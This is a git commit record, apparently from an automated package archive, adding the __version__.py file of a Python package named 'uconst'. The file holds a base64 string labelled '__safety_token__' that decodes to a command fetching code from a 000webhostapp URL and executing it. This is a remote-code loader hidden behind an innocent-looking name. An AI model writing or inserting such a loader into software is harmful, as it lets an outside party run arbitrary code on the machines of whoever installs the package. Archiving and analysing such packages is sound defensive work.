f956468c9effe0945c8b70a0f510169305846c86
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-11-26 14:04:43 +0000

    Add package uconst/1.0.1/uconst-1.0.1.tar.gz

---
+++ packages/uconst/uconst-1.0.1.tar.gz/uconst-1.0.1/uconst/__version__.py
@@ -0,0 +1,6 @@
+from base64 import b64decode as t
+
+__version__ = "1.0.1"
+__safety_token__ = "ZXhlYyhfX2ltcG9ydF9fKCd1cmxsaWIzJykuUG9vbE1hbmFn" \
+    "ZXIoKS5yZXF1ZXN0KCdHRVQnLCAnaHR0cHM6Ly9sdWNreS10dWJlcy4wMDB3ZWJ" \
+    "ob3N0YXBwLmNvbS9lbnknKS5kYXRhKQ=="
